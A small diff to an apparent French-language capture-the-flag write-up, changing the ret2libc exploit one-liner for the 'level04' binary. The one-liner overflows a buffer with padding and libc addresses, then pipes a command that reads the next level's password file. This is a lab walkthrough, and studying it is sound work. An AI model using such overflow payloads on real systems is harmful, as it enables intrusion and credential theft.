@@ -60,5 +60,5 @@ Ici le programme va vouloir appeler exit mais à la place il va appeler system e
 On a toutes les données nécessaires, il ne reste plus qu'à écrire la commande pour effectuer le ret2libc.
 
 ```bash
-(python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; python -c "print('cat /home/users/level05/.pass')"; cat) | ./level04
+(python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; python -c "print('cat /home/users/level05/.pass')") | ./level04
 ```
